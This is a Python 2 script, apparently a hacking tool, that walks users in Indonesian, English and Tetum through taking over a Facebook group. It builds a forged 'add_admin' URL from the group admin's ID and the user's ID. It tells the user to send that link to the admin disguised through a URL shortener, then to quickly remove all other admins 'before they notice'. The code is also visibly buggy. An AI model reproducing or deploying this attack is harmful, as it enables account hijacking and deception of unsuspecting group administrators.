# Author : WenDev89
# JANGAN RECODE FILE INI KALAU TIDAK MAU TERJADI SESUATU YG TAK DIINGINKAN TERJADI. 
# KARNA UDA SAYA SISIPKAN SCRIPT ANTI RECODE, SAYA BISA TAU SIAPA KAMU ^_^
#

import os, sys, time
from termcolor import colored

# Set Colors ######

N = '\033[0m'

W = '\033[1;37m'

B = '\033[1;34m'

R = '\033[1;31m'

G = '\033[1;32m'

Y = '\033[1;33m'

C = '\033[1;36m'

##################

# Restart ####################

def restart_program():

   python = sys.executable

   os.execl(python, python, * sys.argv)

   curdir = os.getcwd()

##############################

os.system("clear")

print colored(" ")
print colored(" ") 
print colored('**Tool For TAKE OVER Admin Facebook Group by', 'white', 'on_blue'), colored('WenDev89', 'red', 'on_green'), colored('**to*', 'white', 'on_blue') 
print colored('MMMMMMMMMMMMMMMMMMMMMMMMM', 'blue'), colored('888888 888888 8888888 8  88888', 'red') 
print colored('MMMMMMMMMMMMMMMNNmdmmMMMM', 'blue'), colored('8    8 8    8 8  8  8 8  8   8', 'red') 
print colored('MMMMMMMMMMMMMMo-     mMMM', 'blue'), colored('8eeee8 8e   8 8e 8  8 8e 8e  8', 'red') 
print colored('MMMMMMMMMMMMMs   .+ooNMMM', 'blue'), colored('88   8 88   8 88 8  8 88 88  8', 'red') 
print colored('MMMMMMMMMMMMM:   yMMMMMMM', 'blue'), colored('88   8 88   8 88 8  8 88 88  8', 'red') 
print colored('MMMMMMMMMMsso.   /ossMMMM', 'blue'), colored('88   8 88eee8 88 8  8 88 88  8', 'red') 
print colored('MMMMMMMMMM          -MMMM', 'blue'), colored('================================', 'white', 'on_blue') 
print colored('MMMMMMMMMMyyy.   +yydMMMM', 'blue'), colored('888888 88888  888888 8   8 888888', 'red') 
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('8    8 8   8  8    8 8   8 8    8', 'red') 
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('8e     8eee8e 8    8 8e  8 8eeee8', 'red') 
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('88  ee 88   8 8    8 88  8 88', 'red')  
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('88   8 88   8 8    8 88  8 88', 'red')  
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('88eee8 88   8 8eeee8 88ee8 88', 'red')
print colored('==========================================================', 'white', 'on_blue')
print colored(" ") 
print colored('Select a Language :', 'cyan') 
print colored('Pilih Bahasa :', 'cyan') 
print(" ")
print colored('[ 01 ]', 'cyan'), colored('INDONESIA', 'white', 'on_red') 
print(" ") 
print colored('[ 02 ]', 'cyan'), colored('ENGLISH', 'white', 'on_blue') 
print colored(' ')
 
bahasa = raw_input("%s(#)%s Pilih%s 01%s atau%s 02 :%s" % (C, C, R, W, B, R))
 
try:

	file = open("link.txt", 'w')

except(IOError):

	print "ERROR"

	sys.exit()

if bahasa.strip() in "01 1".split():
	
  print colored(" ") 
  print colored('Pilihan mu >>>', 'white'), colored('INDONESIA', 'white', 'on_red') 
  time.sleep(2)
  print(" ") 

tahap1 = raw_input("%s[1]%s Cari Group Facebook yg mau di TakOv ADMIN nya%s [ENTER]%s" % (W, G, R, N))
time.sleep(1)
print (" ") 
print colored('[ OK ]', 'yellow', 'on_red') 
print (" ") 
tahap2 = raw_input("%s[2]%s Cari ADMIN Group nya, lalu salin ID Facebook ADMIN tsb%s [ENTER]%s" % (W, G, R, N))
time.sleep(2)
print (" ")
print colored('[ OK ]', 'yellow', 'on_red') 
print (" ") 
tahap3 = raw_input("%s[3]%s Selanjutnya masuk ke Profile Facebook mu, dan salin juga ID Facebook mu%s [ENTER]%s" % (W, G, R, N))
time.sleep(2)
print (" ") 
print colored('[ OK ]', 'yellow', 'on_red') 
print (" ") 
tahap4 = raw_input("%s[4]%s Disarankan dari Browser utk mempermudah menyalin ID nya, jangan dari aplikasi Facebook%s [ENTER]%s" % (W, G, R, N)) 
time.sleep(2)
print (" ") 
print colored('[ OK ]', 'yellow', 'on_red') 
print (" ") 
tahap5 = raw_input("%s[5]%s Setelah ID Facebook Admin Group & ID Facebook mu uda disalin, sekarang kita kombinasikan kedua ID nya%s [ENTER]%s" % (W, G, R, N)) 
time.sleep(2)
print (" ") 
grup = raw_input(" %s[*]%s ID ADMIN GROUP%s >>>%s " % (W, R, W, G))
time.sleep(3)
print (" ") 
anda = raw_input(" %s[*]%s ID KAMU%s >>>%s " % (W, R, W, G))
time.sleep(3)
print colored(' ') 
print colored('[ OK ]', 'yellow', 'on_red')
time.sleep(1)
print colored(' ') 
print colored('[*] Sedang mengkombinasikan kedua ID [*]', 'green') 
print colored(' ') 
time.sleep(4)
print colored('####[25%]#####', 'yellow', 'on_red') 
time.sleep(4)
print colored('########[45%]########', 'yellow', 'on_red') 
time.sleep(3)
print colored('################[65%]#######', 'yellow', 'on_red') 
time.sleep(3)
print colored('########################[75%]#######', 'yellow', 'on_red') 
time.sleep(2)
print colored('################################[85%]#####', 'yellow', 'on_red')
time.sleep(2)
print colored('#######################################[95%]#####', 'yellow', 'on_red')
time.sleep(2)
print colored('###############################################[100%]#####', 'yellow', 'on_red')
time.sleep(2)
print colored(' ') 
print colored('[[######## OK ########]]', 'yellow', 'on_red')
print colored(' ') 
print " %s(%s*%s)%s Hasil%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (W, W, W, R, W, B, grup, anda, N)
print " " 
file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, anda))
print " " 
tahap6 = raw_input("%s6%s)%s Salin link URL hasil kombinasi tsb, lalu kirim link URL nya ke %sADMIN%s Group tsb%s [ENTER] %s" % (W, W, G, C, G, R, N))
print "%s-------------------%s" % (R, N)
tahap7 = raw_input("%s7%s)%s Selanjutnya tinggal menunggu hingga link URL nya diklik oleh si %sADMIN%s Group tsb%s [ENTER] %s" % (W, W, G, C, G, R, N))
print "%s-------------------%s" % (R, N)
tahap8 = raw_input("%s8%s)%s Kalau sudah ada pemberitahuan bahwa kamu sudah dilantik menjadi %sADMIN%s, maka kamu harus secepatnya menendang semua %sADMIN%s yg lain di Group tsb, sebelum mereka sadar akan hal ini...%s[ENTER]%s" % (R, R, W, C, W, R, N))
print "%s-------------------%s" % (R, N)
tahap9 = raw_input("%s9%s)%s Good Luck%s:)%s...%s[ENTER]%s" % (R, R, W, W, W, R, N))
print (" ") 

time.sleep(1)
print "%s[*]%sNB%s:%s ADMIN yg pintar akan langsung menyadari Link URL apa yg anda kirimkan padanya, jadi saya sarankan menggunakan Shortlink untuk memyamarkan Link URL tsb. Bisa dengan%s goo.gl%s atau%s bit.ly%s" % (W, R, W, R, G, R, G) 
time.sleep(1)
print "%sTerima Kasih.%s Sudah bersedia menggunakan Tool ini.%s" % (R, G, N) 
time.sleep(1)
print colored('Script by', 'green'), colored('WenDev89', 'yellow', 'on_red') 

sys.exit()

if bahasa.strip() in "02 2".split():

  print "%s [%s English%s ]%s" % (C, W, C, N)

  print

  step1 = raw_input("%s1%s)%s First Of All Go To The %sFacebook%s Group That You Want To %sHack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step2 = raw_input("%s2%s)%s After That. Go Click On The Group Url And Then Copy 15 Digits Group Magical Code. Example %s(%s 589101351254979 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step3 = raw_input("%s3%s)%s Now Go To Your Profile And Find Your 15 Digits Profile Code. Example %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step4 = raw_input("%s4%s)%s If the url didnt show that 15 digit code. Then try to open %sfacebook%s from the browser...%s[%sEnter%s]%s" % (Y, C, W, B, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step5 = raw_input("%s5%s)%s After Find Both Codes..%sLet we mix it up%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  group = raw_input(" %s(%sa%s)%s Group Code%s >>>%s " % (W, C, W, C, R, Y))

  you = raw_input(" %s(%sb%s)%s Your Code%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Result%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, group, you, N)

  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you))

  print "%s--------------------%s" % (R, N)

  step6 = raw_input("%s6%s)%s Now Copy The Link On The Result And Then Send Copied Link To %sAdmin%s Of The Group. If Its Hard To You To Copy The Link, I Have Save The Link On File *link.txt*. So Its Getting Easier, Just Open The File link.txt And Then Copy The Link Then Send To The %sAdmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step7 = raw_input("%s7%s)%s You Just Need To Wait Till The %sAdmin%s Click On The Link that You Send. Then You Will Be %sAdmin%s Of The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step8 = raw_input("%s8%s)%s Now Don't Waste Your Time. Go To Group Settings And Remove All %sAdmins%s From The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step9 = raw_input("%s9%s)%s Have Fun %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))

  print "%s[%s#%s]%s -------------------%s Done %s-------------------- %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)

  print

  time.sleep(1)

  print "%s*note:clever admin can notice the link just by one blink. So i suggest you to use shortlink like goo.gl or bit.ly etc*%s" % (Y, N)

  time.sleep(1)

  print "%sThanks%s For %sUsing My Program%s %s:')%s" % (C, W, R, W, Y, N)

  time.sleep(1)

  print "%sGood Bye %s:)%s" % (W, Y, N)


if bahasa.strip() in "03 3".split():

  print " %s[%s Tetum%s ]%s" % (R, W, R, N)

  print

  tahap1 = raw_input("%s1%s)%s Primeiro, buka grupo iha%s facebook%s neebe ita boot atu%s hack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap2 = raw_input("%s2%s)%s Depois klik url grupo nian no kopia 15 digit kode grupo. Exemplo kode grupo %sADM%s (%s 589101351254979%s )%s...%s[%sEnter%s]%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap3 = raw_input("%s3%s)%s Agora tama ba ita boot nia profil no buka 15 digit kode profil ita boot nian. Exemplo%s hau nian %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap4 = raw_input("%s4%s)%s Kuando susar ba ita boot atu buka kode 15 digit nee. Koko loke husi browser neebe prepara tia ona husi telfoni...%s[%sEnter%s]%s" % (Y, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap5 = raw_input("%s5%s)%s Depois ita boot hetan ona kode grupo nian no ita boot nian kode profile. Mai ita komesa tama sessaun %sgabung kode%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  grup = raw_input(" %s(%sa%s)%s Kode Grupo nian%s >>>%s " % (W, C, W, C, R, Y))

  ita = raw_input(" %s(%sb%s)%s Kode Ita boot nian%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Rezultado%s >>> %shttps://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, grup, ita, N)

  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, ita))

  print "%s--------------------%s" % (R, N)

  tahap6 = raw_input("%s6%s)%s Agora kopia link rezultado neebe ita gabung no send ba %sadmin%s. Kuando susar ba ita boot atu kopia link nee, hau simpan tia ona link nee iha file *link.txt*. Entaun ita boot hela loke file link.txt no kopia link nee no send ba %sadmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap7 = raw_input("%s7%s)%s Ita boot hela hein too link nee %sadmin%s klik...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap8 = raw_input("%s8%s)%s Kuando ita boot hetan notifikasaun neebe dehan katak ita boot sai ona %sadmin%s, ita boot tenki lalais tebe %sadmin%s hotu iha grupo antes %sadmin%s seluk tebe uluk ita boot...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap9 = raw_input("%s9%s)%s Agora ita boot bele manda grupo ho kontenti %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))

  print "%s[%s#%s]%s ------------------%s Remata %s------------------ %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)

  print

  time.sleep(1)

  print "%s*nota:admin neebe matenek sei nota link ida ita boot send ba nia nee sei lori perigu ba nia, entaun ita boot tenki shortlink link nee ho goo.gl atau bit.ly etc*%s" % (Y, N)

  time.sleep(1)

  print "%sObrigadu%s tamba ita boot uja tia ona%s hau nia program%s %s:')%s" % (C, W, R, W, Y, N)

  time.sleep(1)

  print "%sAdeus %s:)%s" % (W, Y, N)

  sys.exit()

  

else:

	print

	print "%s[%si%s]%s Anda memasukkan perintah yang salah%s" % (Y,R,Y,W,N)

	print "%s[%si%s]%s Wrong Input%s" % (Y,R,Y,W,N)

	print "%s[%si%s]%s Ita boot manda sala%s" % (Y,R,Y,W,N)

	time.sleep(2)

	restart_program()
. 